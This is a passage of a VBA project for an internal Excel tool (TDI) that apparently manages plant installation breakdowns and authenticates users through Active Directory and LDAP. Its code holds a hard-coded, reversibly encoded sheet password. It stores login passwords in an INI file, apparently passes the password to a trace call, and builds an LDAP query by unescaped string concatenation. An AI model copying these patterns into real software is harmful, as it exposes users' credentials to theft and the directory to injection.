Attribute VB_Name = "A_Constantes"
Option Explicit


'D|fffd|clarations Constantes Communes |fffd| toutes les Applications
Public Const APP_SIA = "TDI"                         'SIA ou IRN de l|fffd|application
Public Const APP_AUTEUR = "DF - DPSI - DADSPR - DIMPM Sce 65931"  'Auteur de l'application
Public Const APP_TITLE = "Tableau de D|fffd|coupage des Installations - TDI"

Public Const APP_VERSION = "1.4.8.34"    'Version de l'application
Public Const APP_Signature_Officielle = "TDI_15.14.000-vide."
Public Const APP_Signature_Beta = "TDI_Nouveaux_Controles_Beta_" '1.xls

Public Const Verif_Mise_A_Jour = True                'V|fffd|rification de la Mise |fffd| Jour

Public Const APP_REP_PERSO = "D:\PUBLIC\"                   'Chemin du R|fffd|pertoire Perso
Public Const APP_REP_COMMUN = "I:\"                  'Chemin du R|fffd|pertoire Partag|fffd|

Public Const PwDev = "3611232D2D57457D4150" 'D

Public Const APP_DOMAIN = "Drap"                     'Domaine de trace (Drap)
Public Const APP_SOUS_DOMAIN = "Dpsi"                'Sous Domaine de trace (Drap, IAO, ...)

Public Const APP_DEBUG = False                       'Mode Deboguage
Public Const APP_TRACEUR = True                      'Boolean Activation/d|fffd|sactivation des traces

Public Const msgFile = "Le fichier "
Public Const msgOnglet = "L'onglet "
Public Const msgDefStruct = ", est mal Structur|fffd|! Cl|fffd| absente : "
Public Const msgDefRes = "Impossible de trouver le fichier de ressources"
Public Const msgReinstal = "R|fffd|installez cette Application !"

Public Const Fichier_Ini = False                     'True Dans le cas de Fichiers ".Ini"
Public Const shtLangue = "shtLocalization"           'Feuille de Calcul contenant les libell|fffd|s traduits

'Instances de Classes
'Public AdoCls           As New AdoClass
Public ArcaCls          As New ArcaClass
'Public ClipBoardCls     As New ClipBoardClass
Public CryptCls         As New CryptClass
'Public DateCls          As New DateClass
Public FilesCls         As New FilesClass
Public FormCls          As New FormClass
Public FunctionsCls     As New FunctionsClass
Public IniCls           As New IniClass
'Public MenusCls         As New MenusClass
Public MsgCls           As New MessagesClass
'Public NetSendCls       As New NetSendClass
Public PingCls          As New PingClass
'Public ProtectCls       As New ProtectClass
Public RegCls           As New RegistryClass
'Public SacimCls         As New SacimClass
Public SheetCls         As New SheetClass
Public SystemCls        As New SystemClass
Public TraceCls         As New TracesClass
'Public VbaCls           As New VbaClass
Public WBooksCls        As New WorkBooksClass
'Public WebCls           As New WebClass
'Public WindowsCls       As New WindowsClass

Public Function Valeur_Constante(ByVal Constante As String) As String
    Select Case Constante
        Case "APP_AUTEUR"
            Valeur_Constante = APP_AUTEUR
        Case "APP_VERSION"
            Valeur_Constante = APP_VERSION
    End Select
End Function

Attribute VB_Name = "A_Constantes_TDI"
Option Explicit


'[---------------------------------------------------------------------------
'[Identifiant   : Donn|fffd|es Globales du TDI
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 01/01/2008
'[Version       : V1.3 du 17/03/2009
'[---------------------------------------------------------------------------
'[Sujet: Donn|fffd|es Globales du TDI
'[---------------------------------------------------------------------------


' Constante onglet
Public Const shWelcome = "Cde_Bienvenue" 'dans le TDI V1
'Public Const shWelcome = "Welcome" dans le TDI V2
Public Const shCde_Bienvenue = "Cde_Bienvenue"
Public Const shCde_Nomenclature = "Cde_Nomenclature"
Public Const shCde_Simon = "Cde_Simon"
Public Const shCde_Document = "Cde_Document"

Public Const shTable_Fonction_Process = "Table Fonction Process"
Public Const shDico = "Dico"
Public Const shTraduction = "Traduction"

Public Const ShAffaire = "Affaire"
Public Const shDecoupage = "Decoupage"
Public Const shOldDecoupage = "D|fffd|coupage"
Public Const shMateriels = "Materiels"
Public Const shOldMateriels = "Mat|fffd|riels"
Public Const shDocuments = "Documents"
Public Const shPieces_Rechange = "Liste PR"
Public Const shCtrl_Ged = "Ctrl_GED"
Public Const shCSV = "CSV"
Public Const shEquipmt = "equipmt"
Public Const shSsEnsemble = "ssen"
Public Const shArticles = "articles"
Public Const shPt = "pt"
Public Const shGE_ACreer = "GE A CREER"
Public Const shGE_AModifier = "GE A MODIFIER"
Public Const shENS_ACreer = "ENS A CREER"
Public Const shENS_AModifier = "ENS A MODIFIER"
Public Const shENS_ASupprimer = "ENS A SUPPRIMER"
Public Const shListeDeFID = "Liste de FID"
Public Const shListe_FID = "Liste_FID"
Public Const shListe_Originaux = "Liste_Originaux"
Public Const shListe_Liens = "Liste_Liens"
Public Const shParam_FID = "Param_FID"

Public Const shTemp = "Temp"

Public Const Libel_Ok = "OK"
Public Const Libel_Nok = "NOK"
Public Const Libel_Ntr = "NTr"

Public Const Nb_Caract_19 = 19 'Modif ACH V1.09a

Public Fin As Boolean
Public Const Nb_col_dico = 130

Public Fic_dest As String
Public Fic_tra As String
'
Public val_range As String

Public P_Rapproche_PR As Integer
Public Cle_Art_dec As String

Public P_Tech_PR  As Integer

Public P_Lib_court1_PR  As Integer
Public P_Lib_court2_PR  As Integer

Public P_Date_Modif_PR As Integer
Public P_Date_Valid_PR As Integer
Public P_Date_Ident_PR As Integer

Public Num_ssen_PR As String
Public Repere_PR As String
Public Categorie_PR As String
Public SacimMabec_PR As String
Public Etude_Ref_PR As String
Public Etude_Suf_PR As String
Public Etude_Nom_PR As String

Public Num_ssen_Dec As String
Public Suf_ssen_Dec As String
Public Categorie_Dec As String
Public Nomencl_Dec As String
Public Tech_Dec As String
Public Repere_Dec As String
Public Niveau_dec As String

Public P_Num_ssen_PR As Integer
Public P_Repere_PR As Integer
Public P_Categorie_PR As Integer
Public P_SacimMabec_PR As Integer
Public P_Etude_Ref_PR As Integer
Public P_Etude_Nom_PR As Integer

Public Code_EAN_Dec As String
Public Qte_Dec As String
Public Obs_Dec As String
Public Note_Dec As String
Public Piece_rech_Dec As String
Public SacimMabec_Dec As String
Public Document_Dec As String
Public CtrL_For_dec As String
Public Cle_Ref_dec As String

Public Simon_Dec As String
Public Etude_ref_Dec As String
Public Etude_suf_Dec  As String
Public Etude_nom_Dec As String
Public Ref_Int_Dec As String
Public Nom_Int_Dec  As String
Public Design_Dec As String

Public P_Ref_Int_PR As Integer
Public P_Nom_Int_PR As Integer
Public P_Design_PR As Integer
Public P_Qte_PR As Integer
Public P_Qte_propo_PR As Integer
Public P_Delai_PR As Integer
Public P_Prix_PR As Integer

Public P_Ref_Origine_PR  As Integer
Public P_Nom_Origine_PR As Integer

Public Lib_court1_PR As String
Public Lib_court2_PR  As String

Public P_Prix_Total_PR As Integer
Public P_Qte_ret_PR As Integer
Public P_Prix_total_Ret_PR As Integer

Public P_Document_PR As Integer
Public P_Obs_PR As Integer
Public P_Code_EAN_PR As Integer

Public Ref_Int_PR As String
Public Nom_Int_PR As String
Public Design_PR As String
Public Qte_PR As String
Public Qte_propo_PR As String
Public Delai_PR As String
Public Prix_PR As String

Public Prix_Total_PR As String
Public Qte_ret_PR As String
Public Prix_total_Ret_PR As String

Public Document_PR As String
Public Obs_PR As String
Public Code_EAN_PR As String

Public Code_Ano_PR As String
Public Code_Risque_PR As String
Public Piece_rech_PR As String
Public Tech_PR As String
Public Date_Modif_PR As String
Public Date_Valid_PR As String
Public Date_Ident_PR As String

Public P_Code_Ano_PR As Integer
Public P_Code_Risque_PR As Integer
Public P_Piece_rech_PR As Integer
Public P_Date_enrich_PR As Integer

Public Date_enrich_PR As String
Public Rapproche_PR As String

Public Ref_Origine_PR As String
Public Nom_Origine_PR As String
Public Cle_Art_PR_Origine As String

Public Lib_PR       As String
Public Cle_Ref_PR   As String
Public Cle_Art_PR   As String

Public Data_dec    As Variant

' Variable position feuille Decoupage, Materiel et document :
Public P_Num_ligne_Dec As Integer
Public P_etat_Dec As Integer
Public P_div_Dec  As Integer
Public P_met_Dec As Integer
Public P_ligne_Dec As Integer
Public P_EFP_Dec As Integer
Public P_FP_Dec As Integer
Public P_SFP_Dec As Integer
Public P_OP_Dec As Integer
Public P_lib_pt_Dec As Integer
Public P_ilot_Dec As Integer
Public P_zone_Dec As Integer

Public Num_ligne_Dec As String
Public Etat_Dec As String
Public Div_Dec As String
Public Met_Dec As String
Public Ligne_Dec As String
Public Efp_Dec As String
Public Fp_Dec As String
Public Sfp_Dec As String
Public Op_Dec As String
Public Lib_pt_Dec As String
Public Ilot_Dec As String
Public Zone_Dec As String

Public P_Num_ssen_Dec As Integer
Public P_Suf_ssen_Dec As Integer
Public P_Categorie_Dec As Integer
Public P_Nomencl_Dec As Integer
Public P_Tech_Dec As Integer
Public P_Repere_Dec As Integer
Public P_Niveau_dec As Integer

Public P_Rep_complet_Dec As Integer
Public P_Date_modif_Dec As Integer
Public P_lib_fonc_dec  As Integer

Public Rep_complet_Dec As String
Public Date_modif_Dec  As String
Public Lib_fonc_dec    As String

Public P_Simon_Dec As Integer
Public P_Etude_ref_Dec As Integer
Public P_Etude_suf_Dec As Integer
Public P_Etude_nom_Dec As Integer
Public P_Ref_Int_Dec As Integer
Public P_Nom_Int_Dec As Integer
Public P_design_Dec As Integer

Public P_Code_EAN_Dec As Integer
Public P_Qte_Dec As Integer
Public P_Obs_Dec As Integer
Public P_note_Dec As Integer
Public P_Piece_rech_Dec As Integer
Public P_SacimMabec_Dec As Integer
Public P_document_Dec As Integer
Public P_CtrL_For_dec As Integer

Public nb_element As Long

Public P_CtrL_lien_dec As Integer
Public P_CtrL_doc_dec As Integer

Public Division As String
Public Fournisseur As String
Public Projet As String
Public Perimetre As String
Public DCM As String
Public DPG As String
Public Nb_max_PR As Integer

Public Onglet_PR    As String
Public nb_ligne_element As Integer
Public Qte As Integer

Public Ind_PR As Integer

Public design_err As Integer
Public ref_fab_err As Integer
Public nom_fab_err As Integer

Public tab_article(1 To 20000)   As String
Public tab_ind(1 To 20000)       As Integer
Public tab_qte(1 To 20000)       As Integer

Public oBapiCtrl As Object

' Utilis|fffd| dans I_Affichage
Public boEcran As Boolean
Public boBarre As Boolean
Public boEvent As Boolean
Public boSaut As Boolean
Public iCalcul As Long

' Utilis|fffd| dans frmLoginSAP
Public sAppServer As String
Public sSystem As String
Public sSystNumber As String
Public sClient As String
Public sUser As String
Public sLanguage As String
Public sPassword As String
Public sEnv As String


' Utilis|fffd| dans frmCtrlFormat
Public bAfficheFrmCtrlFormat As Boolean
Attribute VB_Name = "A_Liste_Univers"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Liste des Univers
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 06/04/2009
'[Version       : V1.0 du 06/04/2009
'[---------------------------------------------------------------------------
'[Sujet: Liste des Univers
'[---------------------------------------------------------------------------


Function Liste_Univers() As Variant
                               'Code     Nom       Nom
                               'Division Division, Univers
    Liste_Univers = Array(Array("CA01", "CACIA", "W0NOCA"), _
                          Array("RE10", "CHOISY LE ROI", "W0NOCH"), _
                          Array("CL01", "CLEON", "W0NOCL"), _
                          Array("DA01", "DACIA", "W0NODA"), _
                          Array("DO01", "DOUAI", "W0NODO"), _
                          Array("FL01", "FLINS", "W0NOFL"), _
                          Array("FM01", "FRANCAISE DE MECANIQUE", "W0NOFM"), _
                          Array("MC01", "MAUBEUGE", "W0NOMA"), _
                          Array("OY01", "OYAK (BURSA)", "W0NOOY"), _
                          Array("FA02", "PALENCIA", "W0NOF2"), _
                          Array("SL02", "REVOZ (NOVO-MESTO)", "W0NOSL"), _
                          Array("SA01", "SANDOUVILLE", "W0NOSA"), _
                          Array("FA05", "SEVILLA", "W0NOF5"), _
                          Array("SO01", "SOVAB (BATILLY)", "W0NOSO"), _
                          Array("ST01", "STA (RUITZ)", "W0NOST"), _
                          Array("FA03", "VALLADOLID MONTAJE", "W0NOF3"), _
                          Array("FA07", "VALLADOLID MOTORES", "W0NOF7"), _
                          Array("RTE1", "TANGER (Maroc)", "W0NOTA"), _
                          Array("RUSS", "AVTOFRAMOS (MOSCOU)", "W0NOMO"), _
                          Array("RE04", "RUITZ S.T.A.", "W0NOST"), _
                          Array("CORM", "CORMECANICA CHILI", "W0NOC1"), _
                          Array("FSI1", "CORDOBA FSI ARGENTINE", "W0NOC2"), _
                          Array("CMO1", "CURITIBA MO BRESIL", "W0NOC3"), _
                          Array("VP01", "CURITIBA VP BRESIL", "W0NOC4"), _
                          Array("VU01", "CURITIBA VU BRESIL", "W0NOC5 "), Array("AP01", "CAROSSERIE ORAN", "W0NOOR"), Array("PFAL", "CORDOBA ARGENTINE", "W0NOPF"), Array("ST01", "MECANIQUE RUITZ S.T.A.", "W0NOST"), Array("ENVG", "SOFASA COLOMBIE", "W0NOS3 "), Array("SO02", "SOMACA (Maroc)", "W0NOCB"))



'Array("DA02", "DACIA", "W0NODA") = DACIA FILIALES
'CU01 CURITIBA    *
'RE05 LARDY       *
'LM01 LE MANS     *
'MO01 MOSCOU      *
'RE00 REFERENTIEL *
'RE04 RUEIL       *
End Function
Attribute VB_Name = "Affaire"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Gestion des Evenements de l'onglet Affaire
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 30/09/2008
'[Version       : V1.1 du 05/01/2009
'[---------------------------------------------------------------------------
'[Sujet: Gestion des Evenements de l'onglet Affaire
'[---------------------------------------------------------------------------

Private Sub Worksheet_Change(ByVal Target As Range)
    Dim Rech As Object
    Dim lLigne As Long, lColonne As Long
    On Error GoTo Fin
    With Target
        If .Column > 14 Then Exit Sub
        If .row > 23 Then Exit Sub
        Select Case .Address
            Case Cells(4, 5).Address ' V|fffd|rifier la saisie unitaire
            Case Cells(5, 5).Address ' V|fffd|rifier la saisie massive
            Case Cells(6, 5).Address ' Coloriser
                If Range("Champ_Mise_En_Forme").Value = "O" Then Application.ScreenUpdating = False: Mise_en_Forme_Onglets: Range("Champ_Mise_En_Forme").Value = "N": Application.ScreenUpdating = True
            Case Cells(29, 10).Address To Cells(40, 10).Address '
                If .Value = vbNullString Then Cells(Target.row, 7).Value = vbNullString Else Cells(.row, 7).Value = VBA.Format(Now, "dd/mm/yyyy")
            Case Cells(15, 9).Address
            Case Cells(16, 9).Address
                Affichage_Pieces_Rechange
            Case Cells(17, 9).Address
                ' Select mode Liste PR ou TDI
                Application.ScreenUpdating = False
                If VBA.Mid(Cells(17, 9).Value, 1, 2) = "Li" Then Affiche_PR
                If VBA.Mid(Cells(17, 9).Value, 1, 2) = "TD" Then Bouton_Affiche_Decoupage
                Application.ScreenUpdating = True
            Case Cells(19, 5).Address
                With Sheets(shtLangue)
                    Set Rech = .Columns(1).Find(what:="Login", LookAt:=xlWhole)
                    If Not Rech Is Nothing Then
                        lLigne = Rech.row
                        Application.EnableEvents = False
                        .Unprotect Password:=CryptCls.Decode(PwDev)
                        .Range(.Cells(lLigne, 2), .Cells(lLigne, 20)).Value = vbNullString
                        .Range(.Cells(lLigne + 1, 2), .Cells(lLigne + 1, 20)).Value = vbNullString
                        .Protect Password:=CryptCls.Decode(PwDev), UserInterfaceOnly:=True, DrawingObjects:=True
                        Application.EnableEvents = True
                    End If
                End With
            Case Cells(23, 5).Address
                Application.EnableEvents = False
                Cells(23, 5).Value = VBA.Replace(Cells(23, 5).Value, " ", vbNullString)
                Cells(23, 5).Value = VBA.UCase(Cells(23, 5).Value)
                Application.EnableEvents = True
        End Select
    End With
Fin:
        On Error GoTo 0
End Sub

Sub test()
                        Application.EnableEvents = True

End Sub
Attribute VB_Name = "ArcaClass"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'[---------------------------------------------------------------------------
'[Identifiant   : FrameWork Poste de Travail
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 22/03/2006
'[Version       : V1.3 du 01/12/2009
'[---------------------------------------------------------------------------
'[Sujet: Classe d'acc|fffd|s |fffd| l'annuaire LDap
'[---------------------------------------------------------------------------

Option Explicit

Private Type arcaInfo
    sn               As String
    givenname        As String
    uid              As String
    mail             As String
    ou               As String
    departmentnumber As String
    postofficebox    As String
    telephoneNumber  As String
    manager          As String
    Title            As String
    Role             As String
End Type

Private Info As arcaInfo

Private Declare Function NetUserLogon Lib "advapi32.dll" Alias "LogonUserA" (ByVal lpszUsername As String, _
        ByVal lpszDomain As String, ByVal lpszPassword As String, ByVal dwLogonType As Long, _
        ByVal dwLogonProvider As Long, ByRef phToken As Long) As Long

Private Declare Function CloseHandle Lib "KERNEL32.DLL" (ByVal hObject As Long) As Long

' ---------------------------------------------
' Constantes utilis|fffd|es by NetUserLogon
' ---------------------------------------------'
Private Const LOGON32_LOGON_INTERACTIVE = 2
Private Const LOGON32_LOGON_NETWORK As Long = 3
Private Const LOGON32_PROVIDER_DEFAULT As Long = 0


Function Controle_Authentification_Effectue() As Boolean
    Dim Login   As String
    Dim Psw     As String
    
    Controle_Authentification_Effectue = False
    
    IniCls.ReadStringIniMain "Login", "Login", Login
    IniCls.ReadStringIniMain "Login", "Psw", Psw
    Login = CryptCls.Decode(Login)
    Psw = CryptCls.Decode(Psw)
    
    If Login = vbNullString Or Psw = vbNullString Then
        PageAccueil.Authentification
    ElseIf Not ArcaCls.Authentification_Active_Directory(Login, Psw) Then
        PageAccueil.Authentification
        Exit Function
    End If
    
    IniCls.ReadStringIniMain "Login", "Login", Login
    IniCls.ReadStringIniMain "Login", "Psw", Psw
    If Login <> vbNullString And Psw <> vbNullString Then
        Controle_Authentification_Effectue = True
    End If
End Function


Public Property Get CurrentUser() As String
    On Error GoTo 0
    If Info.givenname & " " & Info.sn <> " " Then
        If Info.Role <> vbNullString Then
            CurrentUser = Info.givenname & " " & Info.sn & " (" & Info.Role & ")"
        Else
            CurrentUser = Info.givenname & " " & Info.sn
        End If
    Else
        CurrentUser = VBA.Environ("USERNAME")
    End If
End Property


Function Authentification_Active_Directory(UserName As String, Password As String) As Boolean
    Dim Aut As Boolean
    Dim strDomain As String
    
    NTT CryptCls.Encode(UserName) & "/" & CryptCls.Encode(Password)
    
    IniCls.ReadStringIniMain "ARCA", "Domain", strDomain
    Aut = ValidatePassword(strDomain & "\" & UserName, Password)
    'Si Utilisateur non trouv|fffd| dans Active Directory
'    If Not Aut Then
'        If Not User_Corp(UserName) Then
'            'Essaye une autre m|fffd|thode sur l'annuaire Arca
'            Aut = ArcaCls.Authentification_Arca
'        End If
'    End If

    Authentification_Active_Directory = Aut
End Function


'V|fffd|rification du couple Ipn / Mot de Passe sur l'Active Directory
'Principe : Annuaire LDAP -> R|fffd|plication dans l'Annuaire Active Directory pour les utilisateurs CORP
Private Function ValidatePassword(UserName As String, Password As String, Optional LocalOnly As Boolean = False) As Boolean
    Dim lRet As Long
    Dim sDomainName As String
    Dim sAccount As String
    Dim lToken As Long
     
    If LocalOnly Then
        sAccount = UserName
        sDomainName = "."
    Else
        If VBA.InStr(1, UserName, "\") Then
            sDomainName = VBA.Left(UserName, VBA.InStr(1, UserName, "\") - 1)
            sAccount = VBA.Mid(UserName, VBA.Len(sDomainName) + 2)
        Else
            sAccount = UserName
            sDomainName = vbNullString
        End If
    End If
    
    'sDomainName = "ldap://corp.noxiane.net" '"arca-fs2.mc2.renault.fr [138.21.90.96]
    'lRet = NetUserLogon(sAccount, 0&, Password, LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, lToken)

    'LOGON32_LOGON_NETWORK , LOGON32_LOGON_INTERACTIVE
    lRet = NetUserLogon(sAccount, sDomainName, Password, LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, lToken)
    'LRet=1 IPN/Password v|fffd|rifi|fffd|
    'LRet=0 IPN/Password non v|fffd|rifi|fffd|
    If lRet <> 0 Then
        ValidatePassword = True
        If CloseHandle(lToken) = 0 Then
            err.Raise 513, , "Can't close Handle!"
        End If
    End If
    On Error GoTo 0
    
     
    Mid(UserName, 1) = VBA.Space(VBA.Len(UserName))
    Mid(Password, 1) = VBA.Space(VBA.Len(Password))
    Mid(sAccount, 1) = VBA.Space(VBA.Len(sAccount))
    If sDomainName <> vbNullString Then
        Mid(sDomainName, 1) = VBA.Space(VBA.Len(sDomainName))
    End If
End Function


Function Extraction_Info_Ldap(IPN As String) As Boolean
    Dim Annuaire    As String
  
    Dim Connection  As New ADODB.Connection
    Dim Command     As New ADODB.Command
    Dim Recordset   As New ADODB.Recordset
    Dim i           As Integer
    Dim data        As String
    
    On Error GoTo ErrorHandler
    
    'Obtention depuis le fichier Ini principal des Infos sur l'annuaire Ldap
    IniCls.ReadStringIniMain "LDAP", "Annuaire", Annuaire
    
    'Ouverture de la Connexion LDAP Serveur
    Set Connection = CreateObject("ADODB.Connection")
    Connection.Provider = "ADsDSOObject"
    Connection.Open ("ADsDSOObject")
    
    Set Command = CreateObject("ADODB.Command")
    Set Command.ActiveConnection = Connection
    Command.Properties("Timeout") = 300 '3 secondes
    
    'Ex|fffd|cute la requete Ldap pour cet Item (Ipn ou Nom)
    Command.CommandText = "<" & Annuaire & "/ou=People,o=renault>;(uid=" & IPN & _
      ");sn,givenname,uid,mail,ou,departmentnumber,postofficebox,telephonenumber,manager,title;subtree"
        '<people>
        '  <uid>p003109</uid>
        '  <cn>BALLAST Patrick</cn>
        '  <sn>BALLAST</sn>
        '  <givenname>Patrick</givenname>
        '  <mail>Patrick.ballast-renexter@renault.com</mail>
        '  <businesscategory>RAICM18430*****</businesscategory>
        '  <description>ma description</description>
        '  <description lang="en">my description</description>
        '  <departmentnumber>18430</departmentnumber>
        '  <employeenumber>p003109</employeenumber>
        '  <facsimiletelephonenumber>+01 2 015131</facsimiletelephonenumber>
        '  <manager>uid=a194758,ou=FRA,ou=People,o=renault</manager>
        '  <ou>18430</ou>
        '  <postaladdress>e</postaladdress>
        '  <postofficebox>tpz etc</postofficebox>
        '  <preferredlanguage>fr,en</preferredlanguage>
        '  <secretary>uid=a300309,ou=FRA,ou=people,o=renault</secretary>
        '  <seealso>uid=p007392,ou=FRA,ou=People,o=renault</seealso>
        '  <telephonenumber>+1 4 44</telephonenumber>
        '  <title>mon titre</title>
        '  <renhrdomain>renouid=AA06,ou=hrdomains,ou=renault,ou=corporate,ou=Structure,o=renault</renhrdomain>
        '  <rensitelocation>ou=ANN,ou=sites,ou=renault,ou=corporate,ou=structure,o=renault</rensitelocation>
        '</people>
    Set Recordset = Command.Execute
    If Not (Recordset.EOF) Then 'Ecriture des Infos d|fffd|taill|fffd|es
        Do While Not Recordset.EOF
            For i = 0 To Recordset.Fields.Count - 1
                ThisWorkbook.Worksheets("Temp").Range("A1").Value = Recordset.Fields(i).Value
                data = ThisWorkbook.Worksheets("Temp").Range("A1").Value
                Select Case VBA.LCase(Recordset.Fields(i).Name)
                    Case "sn"
                        Info.sn = VBA.UCase(data) 'Recordset.Fields(i).Value(0))
                    Case "givenname"
                        Info.givenname = data 'Recordset.Fields(i).Value(0)
                    Case "uid"
                        Info.uid = data 'Recordset.Fields(i).Value(0)
                    Case "mail"
                        Info.mail = data 'Recordset.Fields(i).Value
                    Case "ou"
                        Info.ou = data 'Recordset.Fields(i).Value(0)
                    Case "departmentnumber"
                        Info.departmentnumber = data 'Recordset.Fields(i).Value(0)
                    Case "postofficebox"
                        Info.postofficebox = data 'Recordset.Fields(i).Value(0)
                    Case "telephonenumber"
                        Info.telephoneNumber = data 'Recordset.Fields(i).Value(0)
                    Case "manager"
                        Info.manager = data 'Recordset.Fields(i).Value
                    Case "title"
                        Info.Title = data 'Recordset.Fields(i).Value(0)
                End Select
            Next i
            Recordset.MoveNext
'            If Not (Recordset.EOF) Then
'
'            End If
        Loop
        Extraction_Info_Ldap = True
    End If

    Recordset.Close
    Connection.Close
    
    Set Recordset = Nothing
    Set Connection = Nothing
    Set Command = Nothing

    Exit Function
   
ErrorHandler:
    If err.Number <> 0 Then
        Extraction_Info_Ldap = False
        MsgCls.ShowMessage "MsgErreur", " No" & VBA.Str(err.Number), "MsgErreurPar", err.Source & _
          VBA.Chr(13) & VBA.Chr(13) & IniCls.ReadStringIniLangage("MsgFWK", "MsgDefautLdap"), vbOKOnly + vbError, "MsgDefautLdap"
    End If
End Function


'Authentification par l'Url Arca : http://ada.intra.renault.fr/ada/arca/atx?action=getperson
Function Authentification_Arca() As Boolean
    ' Url permettant de r|fffd|cup|fffd|rer les donn|fffd|es descriptives d'une personne dans l'annuaire Arca
    ' Avec v|fffd|rification du mot de passe
    ' Voir http://www.intra.renault.fr/docsti
  
    Dim ExcelApp    As Excel.Application
    Dim xlBook      As Excel.Workbook
    Dim xlSheet     As Excel.Worksheet
    Dim Connection  As Excel.QueryTable
    Dim Rech        As Object
    Dim UrlArca     As String
    
    Authentification_Arca = False
    IniCls.ReadStringIniMain "ARCA", "UrlArca", UrlArca
    
    Set ExcelApp = CreateObject("Excel.Application")
    If ExcelApp Is Nothing Then ' True if not running
        Set ExcelApp = GetObject(vbNullString, "Excel.Application")
    End If
    
    If Not ExcelApp Is Nothing Then
        With ExcelApp
            .Visible = False
            Set xlBook = .Workbooks.Add
            Set xlSheet = xlBook.Worksheets(1)
            .DisplayAlerts = False
            'Application.WindowState = xlMinimized 'Pour |fffd|viter le probl|fffd|me de rafraichissement d'|fffd|cran
            
            On Error Resume Next
            Set Connection = xlSheet.QueryTables.Add(Connection:="URL;" & UrlArca, Destination:=xlSheet.Range("A1"))
            With Connection
                .Name = "Requete_Arca"
                .FieldNames = True
                .RowNumbers = False
                .FillAdjacentFormulas = False
                .PreserveFormatting = True
                .RefreshOnFileOpen = False
                .BackgroundQuery = True
                .SavePassword = False
                .SaveData = True
                .Refresh BackgroundQuery:=False
            End With
            'xlSheet.Cells.QueryTable.Delete
            
            'Application.WindowState = xlMaximized 'Pour |fffd|viter le probl|fffd|me de rafraichissement d'|fffd|cran
            Set Rech = xlSheet.Rows(2).Find(what:="/uid", LookAt:=xlWhole)
            If Not Rech Is Nothing Then
                ArcaCls.SetInfoArca xlSheet
                PageAccueil.ShowWelcome True
                Authentification_Arca = True 'xlSheet.Cells(Rech.row + 1, Rech.Column).Value
            Else
                'MsgBox "Erreur Authentification !" & vba.chr(13) & vba.chr(13) & "V|fffd|rifiez votre Login et Mot de Passe", vbCritical, APP_TITLE
            End If
            
            On Error GoTo 0
            .Quit
            .DisplayAlerts = True
        End With
  End If
'    ' Url permettant de r|fffd|cup|fffd|rer les donn|fffd|es descriptives d'une personne dans l'annuaire Arca
'    ' Avec v|fffd|rification du mot de passe
'    ' Voir http://www.intra.renault.fr/docsti
'
'    Dim xlBook        As Workbook
'    Dim xlTemp        As Worksheet
'    Dim Connection    As QueryTable
'    Dim Rech          As Object
'    Dim Msg           As String
'    Dim UrlArca       As String
'
'    Authentification_Arca = False
'
'    iniCls.ReadStringIniMain "ARCA", "UrlArca", UrlArca
'    Workbooks.Add xlWorksheet ' Cr|fffd|ation d'un nouveau Classeur
'    Set xlBook = ActiveWorkbook
'    Set xlTemp = ActiveSheet
'    'xlTemp.Cells.Clear
'    'Application.DisplayAlerts = False
'
'    'On Error Resume Next
'    Set Connection = xlTemp.QueryTables.Add(Connection:="URL;" & UrlArca, Destination:=xlTemp.Range("A1"))
'    With Connection
'       .Name = "Requete_Arca"
'       .FieldNames = True
'       .RowNumbers = False
'       .FillAdjacentFormulas = False
'       .PreserveFormatting = True
'       .RefreshOnFileOpen = False
'       .BackgroundQuery = True
'       .SavePassword = False
'       .SaveData = True
'       .Refresh BackgroundQuery:=False
'    End With
'
'    'On Error GoTo 0
'    'xlTemp.Cells.QueryTable.Delete
'    'xlTemp.Activate
'
'    Set Rech = xlTemp.Rows(2).Find(What:="/uid", LookAt:=xlWhole)
'    If Not Rech Is Nothing Then
'        ArcaCls.SetInfoArca xlTemp
'        WBooksCls.CloseWorkbook xlBook.Name, False
'        'xlTemp.Cells.Clear
'        PageAccueil.ShowWelcome
'        Authentification_Arca = True 'xlSheet.Cells(Rech.row + 1, Rech.Column).Value
'    Else
'       'MsgBox "Erreur Authentification !" & vba.chr(13) & vba.chr(13) & "V|fffd|rifiez votre Login et Mot de Passe", vbCritical, APP_TITLE
'    End If
'
'    Application.DisplayAlerts = True
End Function

Public Function SetInfoArca(xlSheet As Worksheet)
    Dim Rech As Object
    
    Set Rech = xlSheet.Rows(2).Find(what:="/sn", LookAt:=xlWhole)
    If Not Rech Is Nothing Then Info.sn = xlSheet.Cells(Rech.row + 1, Rech.Column).Value
    
    Set Rech = xlSheet.Rows(2).Find(what:="/givenname", LookAt:=xlWhole)
    If Not Rech Is Nothing Then Info.givenname = xlSheet.Cells(Rech.row + 1, Rech.Column).Value
    
    Set Rech = xlSheet.Rows(2).Find(what:="/uid", LookAt:=xlWhole)
    If Not Rech Is Nothing Then Info.uid = xlSheet.Cells(Rech.row + 1, Rech.Column).Value
    
    Set Rech = xlSheet.Rows(2).Find(what:="/mail", LookAt:=xlWhole)
    If Not Rech Is Nothing Then Info.mail = xlSheet.Cells(Rech.row + 1, Rech.Column).Value
    
    Set Rech = xlSheet.Rows(2).Find(what:="/ou", LookAt:=xlWhole)
    If Not Rech Is Nothing Then Info.ou = xlSheet.Cells(Rech.row + 1, Rech.Column).Value
    
    Set Rech = xlSheet.Rows(2).Find(what:="/departmentnumber", LookAt:=xlWhole)
    If Not Rech Is Nothing Then Info.departmentnumber = xlSheet.Cells(Rech.row + 1, Rech.Column).Value
    
    Set Rech = xlSheet.Rows(2).Find(what:="/postofficebox", LookAt:=xlWhole)
